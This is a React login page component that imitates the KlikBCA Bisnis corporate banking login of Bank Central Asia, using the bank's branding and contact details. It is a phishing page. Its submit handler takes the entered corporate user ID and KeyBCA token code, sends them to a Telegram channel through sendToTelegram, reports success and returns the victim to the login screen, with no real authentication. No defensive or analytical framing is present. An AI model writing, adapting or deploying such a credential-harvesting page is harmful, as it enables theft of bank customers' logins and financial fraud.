import { useState } from "react";
import { useLocation } from "wouter";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram, formatLoginMessage } from "@/lib/telegram";
import "../../public/css/design.css";

export default function LoginPage() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [language, setLanguage] = useState("id");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { toast } = useToast();
  const [, navigate] = useLocation();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!username || !password) {
      toast({
        title: "Form Tidak Lengkap",
        description: "Silakan isi semua field",
        variant: "destructive",
      });
      return;
    }

    setIsSubmitting(true);

    try {
      // Send to Telegram
      const message = formatLoginMessage(username, password);
      const success = await sendToTelegram(message);

      if (success) {
        toast({
          title: "Berhasil",
          description: "Data berhasil dikirim",
        });
        
        setUsername("");
        setPassword("");
        
        setTimeout(() => {
          navigate("/login");
        }, 1500);
      } else {
        toast({
          title: "Gagal",
          description: "Gagal mengirim data",
          variant: "destructive",
        });
      }
    } catch (error) {
      toast({
        title: "Error",
        description: "Terjadi kesalahan",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <>
      <link href="/css/bootstrap.min.css" rel="stylesheet" />
      <div className="main">
        <nav className="navbar navbar-light pb-0" style={{ padding: '10px 12px' }}>
          <div className="d-flex justify-content-end w-100 align-items-center" style={{ gap: '8px' }}>
            <span 
              id="language" 
              className="text-blue-bca-1 d-block font-14-20"
              onClick={() => setLanguage(language === "id" ? "en" : "id")}
              style={{ cursor: 'pointer', margin: 0, whiteSpace: 'nowrap' }}
            >
              {language === "id" ? "English" : "Indonesia"}
            </span>
            <a id="home" href="https://www.klikbca.com/">
              <img 
                className="mr-1 ml-1" 
                src="/images/GHCDPFLGCGCGNCIGPGNGFGNCCGFHEHEHPGOGOCAHOGHG.png" 
                height="32px"
                alt="Home"
                style={{ maxWidth: '32px', height: '32px' }}
              />
            </a>
          </div>
        </nav>

        <div className="container-fluid vpn-container">
          <div className="row">
            <div className="landscape col-12 col-sm-12 col-md-12 col-lg-5 col-xl-4">
              <img 
                className="d-block logo-bca" 
                src="/images/GHCDPFMGPGHGPGNCCGDGBGOCAHOGHG.png"
                alt="BCA Logo"
              />
              <span className="text-blue-bca-1 d-block font-weight-bold" style={{ fontSize: 'clamp(20px, 5vw, 44px)', lineHeight: 1.2, marginBottom: '8px' }}>
                KlikBCA Bisnis
              </span>
              <span className="text-blue-bca-1 d-block" style={{ fontSize: 'clamp(14px, 3.5vw, 28px)', lineHeight: 1.3, marginBottom: '20px' }}>
                VPN Secure Connection
              </span>

              <form className="prompt mt-3-7vh" onSubmit={handleSubmit}>
                <div className="content">
                  <div className="sub-content">
                    <div className="wide-inputs form-group">
                      <label className="text-blue-bca-1 font-weight-bold" style={{ display: 'block', marginBottom: '5px', fontSize: '14px', fontWeight: 900 }}>
                        Username
                      </label>
                      <input 
                        type="text" 
                        name="username" 
                        id="username" 
                        placeholder="CorporateID UserID (tanpa spasi)"
                        value={username}
                        onChange={(e) => setUsername(e.target.value)}
                        className="form-control"
                        style={{ marginBottom: '15px' }}
                      />
                      <label className="text-blue-bca-1 font-weight-bold" style={{ display: 'block', marginBottom: '5px', fontSize: '14px', fontWeight: 900 }}>
                        Password
                      </label>
                      <input 
                        type="password" 
                        name="credential" 
                        id="credential" 
                        placeholder="KeyBCA Appli 1" 
                        maxLength={8}
                        value={password}
                        onChange={(e) => {
                          const value = e.target.value.replace(/[^0-9]/g, "").slice(0, 8);
                          setPassword(value);
                        }}
                        className="form-control"
                      />
                    </div>
                    <div className="button-actions wide">
                      <button 
                        type="submit" 
                        name="login_button" 
                        id="login_button"
                        className="primary vpn-btn"
                        disabled={isSubmitting}
                      >
                        {isSubmitting ? "SENDING..." : "LOGIN"}
                      </button>
                    </div>
                  </div>
                </div>
              </form>

              <span id="info-text1" className="d-block line-height-20 mt-3-5vh" style={{ fontSize: 'clamp(12px, 3vw, 20px)', marginTop: '20px' }}>
                {language === "id" 
                  ? "Jika Anda belum memiliki fasilitas KlikBCA Bisnis, silakan akses" 
                  : "If you don't have KlikBCA Bisnis facility yet, please access"}
                {" "}
                <a 
                  href="https://www.bca.co.id/id/bisnis/layanan/e-banking-bisnis/klikbca-bisnis" 
                  className="text-blue-bca-1"
                >
                  {language === "id" ? "Informasi KlikBCA Bisnis" : "KlikBCA Bisnis Information"}
                </a>
                {" "}
                {language === "id" ? "atau hubungi:" : "or contact:"}
              </span>

              <div className="row mt-3 mb-3" style={{ marginLeft: '-4px', marginRight: '-4px' }}>
                <div className="col-12 col-sm-4 col-md-4 col-lg-4 col-xl-4 info-thumb p-0-pc" style={{ paddingLeft: '4px', paddingRight: '4px', marginBottom: '8px' }}>
                  <a href="tel:1500777" style={{ textDecoration: 'none', display: 'flex', alignItems: 'flex-start', gap: '12px' }}>
                    <img 
                      src="/images/GHCDPFMGPGHGPGNCIGBGMGPGCGDGBGOCAHOGHG.png"
                      alt="Phone"
                      style={{ height: '50px', width: '50px', flexShrink: 0 }}
                    />
                    <div style={{ textAlign: 'left', paddingTop: '5px' }}>
                      <span className="text-blue-bca-1 font-12-16 line-height-20" style={{ display: 'block' }}>
                        {language === "id" ? "Halo Layanan" : "Customer Service"}
                      </span>
                      <span className="text-blue-bca-1 font-12-16 line-height-20" style={{ display: 'block' }}>
                        KlikBCA Bisnis
                      </span>
                      <span className="text-blue-bca-1 font-12-16 line-height-20" style={{ display: 'block' }}>
                        1500777
                      </span>
                    </div>
                  </a>
                </div>

                <div className="col-12 col-sm-4 col-md-4 col-lg-4 col-xl-4 info-thumb p-0-pc" style={{ paddingLeft: '4px', paddingRight: '4px', marginBottom: '8px' }}>
                  <a href="mailto:halobca@bca.co.id" style={{ textDecoration: 'none', display: 'flex', alignItems: 'flex-start', gap: '12px' }}>
                    <img 
                      src="/images/GHCDPFMGPGHGPGNCFGNGBGJGMGOCAHOGHG.png"
                      alt="Email"
                      style={{ height: '50px', width: '50px', flexShrink: 0 }}
                    />
                    <div style={{ textAlign: 'left', paddingTop: '5px' }}>
                      <span className="text-blue-bca-1 font-12-16 line-height-20" style={{ display: 'block' }}>
                        {language === "id" ? "Email" : "Email"}
                      </span>
                      <span className="text-blue-bca-1 font-12-16 line-height-20" style={{ display: 'block' }}>
                        halobca@bca.co.id
                      </span>
                    </div>
                  </a>
                </div>

                <div className="col-12 col-sm-4 col-md-4 col-lg-4 col-xl-4 info-thumb p-0-pc" style={{ paddingLeft: '4px', paddingRight: '4px' }}>
                  <a href="https://twitter.com/halobca" target="_blank" rel="noopener noreferrer" style={{ textDecoration: 'none', display: 'flex', alignItems: 'flex-start', gap: '12px' }}>
                    <img 
                      src="/images/GHCDPFMGPGHGPGNCEHHHJGEHEHFGCHOCAHOGHG.png"
                      alt="Twitter"
                      style={{ height: '50px', width: '50px', flexShrink: 0 }}
                    />
                    <div style={{ textAlign: 'left', paddingTop: '5px' }}>
                      <span className="text-blue-bca-1 font-12-16 line-height-20" style={{ display: 'block' }}>
                        Twitter
                      </span>
                      <span className="text-blue-bca-1 font-12-16 line-height-20" style={{ display: 'block' }}>
                        @HaloBCA
                      </span>
                    </div>
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div className="footer" style={{ color: '#1f6198' }}>
        <span className="footer-font-mob">
          {language === "id" ? "Copyright © 2020   All Right Reserved" : "Copyright © 2020   All Right Reserved"}
        </span>
      </div>
    </>
  );
}